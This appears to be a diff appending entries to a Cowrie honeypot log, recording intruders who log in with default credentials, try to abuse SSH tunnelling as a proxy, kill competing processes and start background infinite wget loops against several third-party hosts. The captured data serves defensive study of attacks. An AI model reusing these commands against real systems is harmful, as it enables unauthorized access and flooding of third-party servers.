@@ -528,3 +528,110 @@
 2017-04-11T19:22:57+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 93.174.95.38:49544 (10.8.41.81:2223) [session: TT223645]
 2017-04-11T19:23:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,104814,91.195.103.196] got channel 'direct-tcpip' request
 2017-04-11T19:23:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,104814,91.195.103.196] direct-tcp connection request to 54.225.186.255:80 from localhost:5556
+2017-04-11T19:23:18+0000 [CowrieTelnetTransport,223645,93.174.95.38] login attempt: 1971
+2017-04-11T19:23:18+0000 [CowrieTelnetTransport,223645,93.174.95.38] login return, expect: [root/admin]
+2017-04-11T19:23:21+0000 [CowrieTelnetTransport,223645,93.174.95.38] login attempt [root/admin] succeeded
+2017-04-11T19:23:22+0000 [CowrieTelnetTransport,223645,93.174.95.38] Opening TTY Log: log/tty/20170411-192322-None-223645i.log
+2017-04-11T19:23:22+0000 [CowrieTelnetTransport,223645,93.174.95.38] Warning: state changed and new state returned
+2017-04-11T19:23:22+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 185.145.252.26:32112 (10.8.41.81:2222) [session: 214b379f]
+2017-04-11T19:23:22+0000 [HoneyPotSSHTransport,104915,185.145.252.26] Remote SSH version: SSH-2.0-PuTTY_Release_0.63
+2017-04-11T19:23:22+0000 [HoneyPotSSHTransport,104915,185.145.252.26] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-rsa'
+2017-04-11T19:23:22+0000 [HoneyPotSSHTransport,104915,185.145.252.26] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T19:23:22+0000 [HoneyPotSSHTransport,104915,185.145.252.26] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T19:23:22+0000 [HoneyPotSSHTransport,104915,185.145.252.26] NEW KEYS
+2017-04-11T19:23:22+0000 [HoneyPotSSHTransport,104915,185.145.252.26] starting service 'ssh-userauth'
+2017-04-11T19:23:23+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104915,185.145.252.26] 'admin' trying auth 'none'
+2017-04-11T19:23:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104915,185.145.252.26] 'admin' authenticated with 'none'
+2017-04-11T19:23:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,104915,185.145.252.26] starting service 'ssh-connection'
+2017-04-11T19:23:24+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,104915,185.145.252.26] got channel 'direct-tcpip' request
+2017-04-11T19:23:24+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,104915,185.145.252.26] direct-tcp connection request to google.com:80 from localhost:8080
+2017-04-11T19:23:24+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,104915,185.145.252.26] direct-tcp forward to google.com:80 with data 'GET /\r\n'
+2017-04-11T19:23:24+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,104915,185.145.252.26] failed to connect: Connection refused
+2017-04-11T19:23:24+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,104915,185.145.252.26] sending close 0
+2017-04-11T19:23:24+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,104915,185.145.252.26] remote eof
+2017-04-11T19:23:24+0000 [HoneyPotSSHTransport,104915,185.145.252.26] avatar admin logging out
+2017-04-11T19:23:24+0000 [HoneyPotSSHTransport,104915,185.145.252.26] connection lost
+2017-04-11T19:23:24+0000 [HoneyPotSSHTransport,104915,185.145.252.26] Connection lost after 2 seconds
+2017-04-11T19:23:28+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: shell
+2017-04-11T19:23:28+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: shell
+2017-04-11T19:23:28+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: enable
+2017-04-11T19:23:28+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: enable 
+2017-04-11T19:23:28+0000 [CowrieTelnetTransport,223645,93.174.95.38] Reading txtcmd from "txtcmds/bin/enable"
+2017-04-11T19:23:28+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: system
+2017-04-11T19:23:28+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: system
+2017-04-11T19:23:28+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh
+2017-04-11T19:23:28+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh 
+2017-04-11T19:23:28+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: run
+2017-04-11T19:23:28+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: run
+2017-04-11T19:23:38+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: killall wget; killall ping; killall sh
+2017-04-11T19:23:38+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: killall wget
+2017-04-11T19:23:38+0000 [CowrieTelnetTransport,223645,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-04-11T19:23:38+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: killall ping
+2017-04-11T19:23:38+0000 [CowrieTelnetTransport,223645,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-04-11T19:23:38+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: killall sh
+2017-04-11T19:23:38+0000 [CowrieTelnetTransport,223645,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-04-11T19:23:48+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: shell
+2017-04-11T19:23:48+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: shell
+2017-04-11T19:23:48+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: enable
+2017-04-11T19:23:48+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: enable 
+2017-04-11T19:23:48+0000 [CowrieTelnetTransport,223645,93.174.95.38] Reading txtcmd from "txtcmds/bin/enable"
+2017-04-11T19:23:48+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: system
+2017-04-11T19:23:48+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: system
+2017-04-11T19:23:48+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh
+2017-04-11T19:23:48+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh 
+2017-04-11T19:23:48+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: run
+2017-04-11T19:23:48+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: run
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T19:23:59+0000 [CowrieTelnetTransport,223645,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
